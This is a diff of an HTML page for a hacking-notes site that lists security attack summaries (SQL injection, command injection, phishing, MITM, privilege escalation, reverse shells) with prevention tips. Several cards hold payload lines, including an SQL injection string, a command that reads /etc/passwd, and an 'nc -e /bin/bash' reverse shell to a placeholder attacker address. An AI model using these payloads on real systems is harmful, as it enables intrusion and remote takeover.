@@ -1,34 +1,41 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Notes | BlackHatNotes</title>
+    <title>Notes | BlackHatters</title>
     <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
     <link rel="stylesheet" href="styles.css">
 </head>
-<body class="bg-black text-white">
-    <header class="bg-black p-5 shadow fixed w-full z-50">
+
+<body class="bg-black text-white font-mono tracking-wide">
+    <!-- Header -->
+    <header class="bg-black p-5 shadow fixed w-full z-50 border-b-2 border-gray-800">
         <div class="container mx-auto flex justify-between items-center">
-            <h1 class="text-2xl text-green-400 font-bold">BlackHatNotes</h1>
+            <a href="index.html">
+                <h1 class="text-2xl text-green-400 font-bold">BlackHatNotes</h1>
+            </a>
             <nav class="space-x-6">
-                <a href="index.html" class="hover:text-green-400">Home</a>
-                <a href="notes.html" class="hover:text-green-400">Notes</a>
-                <a href="services.html" class="hover:text-green-400">Services</a>
-                <a href="about.html" class="hover:text-green-400">About</a>
-                <a href="contact.html" class="hover:text-green-400">Contact</a>
+                <a href="index.html" class="text-gray-300 hover:text-green-400 transition duration-300 ease-in-out">Home</a>
+                <a href="notes.html" class="text-gray-300 hover:text-green-400 transition duration-300 ease-in-out">Notes</a>
+                <a href="services.html" class="text-gray-300 hover:text-green-400 transition duration-300 ease-in-out">Services</a>
+                <a href="about.html" class="text-gray-300 hover:text-green-400 transition duration-300 ease-in-out">About</a>
+                <a href="contact.html" class="text-gray-300 hover:text-green-400 transition duration-300 ease-in-out">Contact</a>
             </nav>
         </div>
     </header>
+    
 
+    <!-- Main Content -->
     <main class="container mx-auto px-5 pt-32 pb-16">
-        <h2 class="text-4xl font-bold mb-8 text-green-300 text-center">🧠 BlackHat Knowledge Base</h2>
+        <h2 class="text-4xl font-bold mb-8 text-green-300 text-center animate-pulse">🧠 BlackHatters Knowledge Base</h2>
         <div class="mb-10">
-            <input id="searchInput" type="text" placeholder="🔍 Search notes..." class="w-full p-3 bg-gray-800 border border-gray-700 rounded">
+            <input id="searchInput" type="text" placeholder="🔍 Search notes..." class="w-full p-3 bg-gray-800 border border-gray-700 rounded text-green-400 focus:outline-none focus:ring-2 focus:ring-green-500 transition duration-300 ease-in-out">
         </div>
         <div id="notesList" class="grid gap-6 md:grid-cols-2 xl:grid-cols-3">
             <!-- SQL Injection -->
-            <div class="bg-gray-800 p-6 rounded-lg shadow-md">
+            <div class="bg-gray-800 p-6 rounded-lg shadow-lg border border-gray-700 hover:shadow-xl hover:border-green-400 transition duration-300 ease-in-out">
                 <h3 class="text-xl text-green-400 mb-2">Web: SQL Injection</h3>
                 <ul class="text-gray-300 list-disc pl-5">
                     <li><code>' OR 1=1 --</code></li>
@@ -38,149 +45,117 @@
                     <li>Prevention: Prepared Statements, ORM, Input Validation</li>
                 </ul>
             </div>
+            
             <!-- Cross-Site Scripting (XSS) -->
-            <div class="bg-gray-800 p-6 rounded-lg shadow-md">
+            <div class="bg-gray-800 p-6 rounded-lg shadow-lg border border-gray-700 hover:shadow-xl hover:border-green-400 transition duration-300 ease-in-out">
                 <h3 class="text-xl text-green-400 mb-2">Web: Cross-Site Scripting (XSS)</h3>
                 <ul class="text-gray-300 list-disc pl-5">
                     <li>Reflected XSS</li>
                     <li>Stored XSS</li>
                     <li>DOM-based XSS</li>
-                    <li>Payload: <code>&lt;img src="javascript:alert('XSS')"&gt;</code></li>
-                    <li>Mitigation: Content Security Policy (CSP), HTML Encoding</li>
+                    <li>Prevention: Input Encoding, CSP (Content Security Policy), HTML Sanitization</li>
                 </ul>
             </div>
+            
             <!-- Command Injection -->
-            <div class="bg-gray-800 p-6 rounded-lg shadow-md">
-                <h3 class="text-xl text-green-400 mb-2">System: Command Injection</h3>
+            <div class="bg-gray-800 p-6 rounded-lg shadow-lg border border-gray-700 hover:shadow-xl hover:border-green-400 transition duration-300 ease-in-out">
+                <h3 class="text-xl text-green-400 mb-2">Web: Command Injection</h3>
                 <ul class="text-gray-300 list-disc pl-5">
-                    <li>Example: <code>ping google.com; ls -la</code></li>
-                    <li>Methods: Shell escape characters</li>
-                    <li>Mitigation: Input validation, least privilege</li>
-                </ul>
-            </div>
-            <!-- Buffer Overflow -->
-            <div class="bg-gray-800 p-6 rounded-lg shadow-md">
-                <h3 class="text-xl text-green-400 mb-2">System: Buffer Overflow</h3>
-                <ul class="text-gray-300 list-disc pl-5">
-                    <li>Overflow exploits memory corruption</li>
-                    <li>Example: <code>AAAA...AAAA</code></li>
-                    <li>Exploit: EIP overwrite for arbitrary code execution</li>
-                    <li>Mitigation: Stack canaries, ASLR, DEP</li>
-                </ul>
-            </div>
-            <!-- Phishing Attack -->
-            <div class="bg-gray-800 p-6 rounded-lg shadow-md">
-                <h3 class="text-xl text-green-400 mb-2">Social Engineering: Phishing Attack</h3>
-                <ul class="text-gray-300 list-disc pl-5">
-                    <li>Target: User credentials and sensitive data</li>
-                    <li>Techniques: Email spoofing, fake websites</li>
-                    <li>Mitigation: User awareness, multi-factor authentication</li>
-                </ul>
-            </div>
-            <!-- Man-in-the-Middle (MITM) -->
-            <div class="bg-gray-800 p-6 rounded-lg shadow-md">
-                <h3 class="text-xl text-green-400 mb-2">Network: Man-in-the-Middle (MITM)</h3>
-                <ul class="text-gray-300 list-disc pl-5">
-                    <li>Example: SSL stripping, ARP spoofing</li>
-                    <li>Tools: Wireshark, mitmproxy</li>
-                    <li>Mitigation: TLS, VPN, HTTPS</li>
-                </ul>
-            </div>
-            <!-- Directory Traversal -->
-            <div class="bg-gray-800 p-6 rounded-lg shadow-md">
-                <h3 class="text-xl text-green-400 mb-2">Web: Directory Traversal</h3>
-                <ul class="text-gray-300 list-disc pl-5">
-                    <li>Attack: Accessing restricted files via <code>../../etc/passwd</code></li>
-                    <li>Prevention: Input sanitization, proper access controls</li>
-                    <li>Tools: Burp Suite, OWASP ZAP</li>
-                </ul>
-            </div>
-            <!-- RCE (Remote Code Execution) -->
-            <div class="bg-gray-800 p-6 rounded-lg shadow-md">
-                <h3 class="text-xl text-green-400 mb-2">System: Remote Code Execution (RCE)</h3>
-                <ul class="text-gray-300 list-disc pl-5">
-                    <li>Vulnerability: Untrusted input execution</li>
-                    <li>Example: WebShell, System backdoor</li>
-                    <li>Mitigation: Input validation, code reviews</li>
+                    <li><code>; ls</code></li>
+                    <li><code>&& cat /etc/passwd</code></li>
+                    <li>Prevention: Input Validation, Proper Escaping, Disabling Unnecessary Commands</li>
                 </ul>
             </div>
 
-            <!-- Additional Notes -->
-            <!-- Cross-Site Request Forgery (CSRF) -->
-            <div class="bg-gray-800 p-6 rounded-lg shadow-md">
-                <h3 class="text-xl text-green-400 mb-2">Web: Cross-Site Request Forgery (CSRF)</h3>
+            <!-- Phishing Techniques -->
+            <div class="bg-gray-800 p-6 rounded-lg shadow-lg border border-gray-700 hover:shadow-xl hover:border-green-400 transition duration-300 ease-in-out">
+                <h3 class="text-xl text-green-400 mb-2">Social Engineering: Phishing</h3>
                 <ul class="text-gray-300 list-disc pl-5">
-                    <li>Attacks: Forced actions on behalf of an authenticated user</li>
-                    <li>Example: Form submission manipulation</li>
-                    <li>Mitigation: Anti-CSRF tokens, SameSite cookies</li>
+                    <li>Credential Harvesting</li>
+                    <li>Business Email Compromise (BEC)</li>
+                    <li>Fake Login Pages</li>
+                    <li>Prevention: Email Filtering, Multi-Factor Authentication (MFA)</li>
                 </ul>
             </div>
-            <!-- Clickjacking -->
-            <div class="bg-gray-800 p-6 rounded-lg shadow-md">
-                <h3 class="text-xl text-green-400 mb-2">Web: Clickjacking</h3>
+            
+            <!-- Password Cracking -->
+            <div class="bg-gray-800 p-6 rounded-lg shadow-lg border border-gray-700 hover:shadow-xl hover:border-green-400 transition duration-300 ease-in-out">
+                <h3 class="text-xl text-green-400 mb-2">Password Cracking: Brute Force & Dictionary Attacks</h3>
                 <ul class="text-gray-300 list-disc pl-5">
-                    <li>Technique: Framing the target site with transparent content</li>
-                    <li>Mitigation: X-Frame-Options header, Content Security Policy (CSP)</li>
+                    <li>Tools: Hydra, John the Ripper, Hashcat</li>
+                    <li>Prevention: Strong Password Policies, Rate Limiting, Account Lockouts</li>
                 </ul>
             </div>
-            <!-- Session Fixation -->
-            <div class="bg-gray-800 p-6 rounded-lg shadow-md">
-                <h3 class="text-xl text-green-400 mb-2">Web: Session Fixation</h3>
+
+            <!-- Man-in-the-Middle (MITM) Attack -->
+            <div class="bg-gray-800 p-6 rounded-lg shadow-lg border border-gray-700 hover:shadow-xl hover:border-green-400 transition duration-300 ease-in-out">
+                <h3 class="text-xl text-green-400 mb-2">Network: Man-in-the-Middle (MITM) Attack</h3>
                 <ul class="text-gray-300 list-disc pl-5">
-                    <li>Attack: Attacker sets session ID for victim</li>
-                    <li>Mitigation: Regenerate session IDs on login, use secure cookies</li>
+                    <li>Packet Sniffing</li>
+                    <li>Session Hijacking</li>
+                    <li>SSL Stripping</li>
+                    <li>Prevention: SSL/TLS, Certificate Pinning, HSTS</li>
                 </ul>
             </div>
+
             <!-- DNS Spoofing -->
-            <div class="bg-gray-800 p-6 rounded-lg shadow-md">
+            <div class="bg-gray-800 p-6 rounded-lg shadow-lg border border-gray-700 hover:shadow-xl hover:border-green-400 transition duration-300 ease-in-out">
                 <h3 class="text-xl text-green-400 mb-2">Network: DNS Spoofing</h3>
                 <ul class="text-gray-300 list-disc pl-5">
-                    <li>Exploit: Redirecting a victim’s DNS queries to malicious IPs</li>
-                    <li>Tools: Ettercap, DNSChef</li>
-                    <li>Mitigation: DNSSEC, DNS-over-HTTPS</li>
+                    <li>Redirecting Traffic to Fake Servers</li>
+                    <li>ARP Spoofing for DNS Poisoning</li>
+                    <li>Prevention: DNSSEC, Secure DNS Servers</li>
                 </ul>
             </div>
-            <!-- ARP Spoofing -->
-            <div class="bg-gray-800 p-6 rounded-lg shadow-md">
-                <h3 class="text-xl text-green-400 mb-2">Network: ARP Spoofing</h3>
+
+            <!-- Privilege Escalation -->
+            <div class="bg-gray-800 p-6 rounded-lg shadow-lg border border-gray-700 hover:shadow-xl hover:border-green-400 transition duration-300 ease-in-out">
+                <h3 class="text-xl text-green-400 mb-2">Privilege Escalation: Linux</h3>
                 <ul class="text-gray-300 list-disc pl-5">
-                    <li>Attack: Poisoning the ARP cache to intercept traffic</li>
-                    <li>Tools: Ettercap, Cain & Abel</li>
-                    <li>Mitigation: Static ARP entries, use of VPN</li>
+                    <li>Exploiting Sudoers Misconfigurations</li>
+                    <li>Kernel Exploits</li>
+                    <li>Prevention: Secure Sudoers Configuration, Kernel Hardening</li>
                 </ul>
             </div>
-            <!-- Evil Twin Attack -->
-            <div class="bg-gray-800 p-6 rounded-lg shadow-md">
-                <h3 class="text-xl text-green-400 mb-2">Network: Evil Twin Attack</h3>
+
+            <!-- Reverse Shell -->
+            <div class="bg-gray-800 p-6 rounded-lg shadow-lg border border-gray-700 hover:shadow-xl hover:border-green-400 transition duration-300 ease-in-out">
+                <h3 class="text-xl text-green-400 mb-2">Reverse Shells</h3>
                 <ul class="text-gray-300 list-disc pl-5">
-                    <li>Technique: Fake Wi-Fi access point to capture credentials</li>
-                    <li>Mitigation: Use of VPN, strong WPA2 passwords</li>
+                    <li>Reverse Shell: <code>nc -e /bin/bash <attacker_ip> <port></code></li>
+                    <li>Netcat and Bash Bind Shells</li>
+                    <li>Prevention: Firewall Rules, Intrusion Detection Systems (IDS)</li>
                 </ul>
             </div>
-            <!-- Zero-Day Vulnerability -->
-            <div class="bg-gray-800 p-6 rounded-lg shadow-md">
-                <h3 class="text-xl text-green-400 mb-2">General: Zero-Day Vulnerability</h3>
+
+            <!-- DDoS Attack -->
+            <div class="bg-gray-800 p-6 rounded-lg shadow-lg border border-gray-700 hover:shadow-xl hover:border-green-400 transition duration-300 ease-in-out">
+                <h3 class="text-xl text-green-400 mb-2">Network: DDoS Attack</h3>
                 <ul class="text-gray-300 list-disc pl-5">
-                    <li>Definition: A vulnerability that is unknown to the vendor</li>
-                    <li>Exploited before a patch is released</li>
-                    <li>Mitigation: Prompt patching, monitoring CVE databases</li>
+                    <li>Botnets for Distributed Attacks</li>
+                    <li>Flooding Traffic to Overwhelm Systems</li>
+                    <li>Prevention: Rate Limiting, Load Balancing, Traffic Filtering</li>
                 </ul>
             </div>
-            <!-- Trojan Horse -->
-            <div class="bg-gray-800 p-6 rounded-lg shadow-md">
-                <h3 class="text-xl text-green-400 mb-2">Malware: Trojan Horse</h3>
+            
+            <!-- Wireless Sniffing -->
+            <div class="bg-gray-800 p-6 rounded-lg shadow-lg border border-gray-700 hover:shadow-xl hover:border-green-400 transition duration-300 ease-in-out">
+                <h3 class="text-xl text-green-400 mb-2">Wireless: Sniffing</h3>
                 <ul class="text-gray-300 list-disc pl-5">
-                    <li>Example: Malware disguised as legitimate software</li>
-                    <li>Mitigation: Antivirus software, email filtering</li>
+                    <li>Wireshark for Wireless Traffic Analysis</li>
+                    <li>WEP/WPA Cracking</li>
+                    <li>Prevention: WPA2, Network Segmentation</li>
                 </ul>
             </div>
         </div>
     </main>
 
-    <footer class="bg-black text-center text-gray-300 py-4">
-        <p>&copy; 2025 BlackHatNotes - All Rights Reserved</p>
+    <!-- Footer -->
+    <footer class="bg-black text-center text-gray-300 py-4 border-t-2 border-gray-800">
+        <p>&copy; 2025 BlackHatters - All Rights Reserved</p>
     </footer>
 
     <script src="script.js"></script>
 </body>
+
 </html>
